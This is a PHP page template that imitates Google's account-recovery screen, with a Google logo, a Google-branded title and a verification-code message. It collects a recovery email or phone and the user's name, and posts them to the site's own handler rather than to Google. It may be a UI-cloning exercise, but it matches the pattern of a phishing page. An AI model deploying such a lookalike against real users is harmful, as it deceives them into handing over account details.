<?php
require 'config.php';
$title = "Fazer Conta nas Contas Google";
?>
<?php require 'partials/header-login.php'; ?>

<form method="POST" action="<?= $base; ?>/env-email.php">
    <div class="group-align" data-url="<?= $base; ?>">
        <div class="group-title">
            <img src="assets/images/pngwing.com.png" alt="logo google">
            <h2>Find your email</h2>
            <p>Enter your recovery phone number or email</p>
        </div>
        <div class="group-i" id="recover-email">
            <div class="containeri-x">
                <div class="fieldset-row-2">
                    <div class="align-i">
                        <fieldset id="error-11">
                            <legend>Email or phone</legend>
                            <input id="11" type="text" name="recover-email">
                        </fieldset>
                        <span id="msg-11">Obrigatório</span>
                    </div>
                </div>
                <div class="link"></div>
                <div class="access-i"></div>
                <div class="group-row">
                    <div class="col-acess-2"></div>
                    <div class="col-acess-2 align-i">
                        <button id="recover-button-email" type="button">Next</button>
                    </div>
                </div>
            </div>
        </div>
        <div class="group-i name-i-x" id="recover-name">
            <div class="containeri-x">
                <div class="fieldset-row-2">
                    <div class="align-i">
                        <fieldset id="error-12">
                            <legend>First name</legend>
                            <input type="text" id="12" name="first-name-user">
                        </fieldset>
                        <span id="msg-12">Obrigatório</span>
                    </div>
                </div>

                <div class="fieldset-row-2">
                    <div class="align-i">
                        <fieldset id="error-13">
                            <legend>last name</legend>
                            <input type="text" id="13" name="last-name-user">
                        </fieldset>
                        <span id="msg-13">Obrigatório</span>
                    </div>
                </div>
                <div class="link"></div>
                <div class="access-i"></div>
                <div class="group-row">
                    <div class="col-acess-2"></div>
                    <div class="col-acess-2 align-i">
                        <button id="recover-button-name" type="button">Next</button>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="group-i env-email-recover">
        <div class="containeri-x">
                <div class="image-i">
                    <img src="<?= $base; ?>/assets/images/um-gif-animado-12162640777140.gif">
                </div>
                <div class="link">
                    A Google enviará um código de verificação para <strong><strong>
                </div>
                <div class="access-i"></div>
                <div class="group-row">
                    <div class="col-acess-2"></div>
                    <div class="col-acess-2 align-i">
                    <button id="button-env-code" type="text">Enviar</button>
                    </div>
                    
                </div>
            </div>
        </div>
      
</form>
<?php require 'partials/footer-login.php'; ?>